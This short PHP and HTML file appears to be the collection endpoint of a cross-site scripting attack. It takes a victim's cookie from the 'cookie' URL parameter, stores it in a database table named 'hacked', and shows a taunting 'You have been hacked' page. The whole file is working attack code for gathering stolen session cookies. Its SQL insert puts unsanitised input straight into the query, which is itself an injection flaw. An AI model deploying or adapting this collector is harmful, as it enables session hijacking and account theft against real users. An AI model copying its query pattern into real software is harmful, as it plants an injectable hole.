<?php
if (isset($_GET["cookie"])){
	include "../credentials.php";
	$cookie = $_GET["cookie"] ?? '';
	$sql = "INSERT into hacked values ('$cookie');";
	mysqli_query($conn,$sql);
}
?>
<html>
	<head>
		<title>Hacked!</title>
	  <script src="https://code.jquery.com/jquery-3.4.1.js"></script>
	</head>
	<body style="margin:0;padding:0;width:100%;height:100%;">
		<h1> Haha! You have been hacked :) </h1>
	</body>
</html>
